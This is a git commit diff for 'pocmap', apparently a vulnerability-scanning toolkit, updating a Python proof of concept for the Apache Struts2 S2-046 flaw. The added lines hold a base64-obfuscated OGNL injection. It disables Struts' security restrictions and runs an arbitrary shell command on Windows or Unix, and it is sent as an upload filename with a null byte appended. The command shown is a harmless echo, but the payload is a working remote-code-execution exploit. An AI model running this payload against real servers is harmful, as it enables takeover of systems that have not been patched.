b40d5efbe929d14c13263a5156e40c12aec28aa4
sfish <sfish@sfishdeMacBook-Pro.local>
2017-03-21 17:23:01 +0800

    pocmap v1.0

--- script/struts/struts2046.py
+++ script/struts/struts2046.py
@@ -3,6 +3,7 @@
 # from ..t import T
 from t import T
 import requests
+import base64
 import sys
 class P(T):
     def __init__(self):
@@ -26,12 +27,15 @@ class P(T):
         timeout=3
         result['result']=False
         res=None
-        payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
+        #payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
+        command = 'echo test60253718'
+        payload_l = base64.decodestring(u'JXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2VzKCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigjY21kPSc=')
+        payload_r = base64.decodestring(u'JykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfQ==')
+        end_null_byte = '0063'.decode('hex')
+        payload = payload_l + command + payload_r + end_null_byte
         try:
-            '''
             headers = {}
             headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-            headers['Content-Length'] = '10000000'
             if productname.has_key('cookie'):
                 headers['Cookie'] = productname['cookie']
 
@@ -39,7 +43,7 @@ class P(T):
                 'upload': (payload, 'Kaboom', 'text/plain')
             }
             r = requests.post(target_url, files=files, headers=headers)
-            res_headers = dict(r.headers)
+            res_html = r.content
         except Exception,e:
             print e
             return result
@@ -47,10 +51,9 @@ class P(T):
             if res is not None:
                 res.close()
                 del res
-            '''
             
                 
-        if res_headers.has_key('X-Test') and res_headers['X-Test'] == 'Kaboom':
+        if res_html.find("test60253718") <> -1:
 
 
             info = target_url + "struts046 Vul"
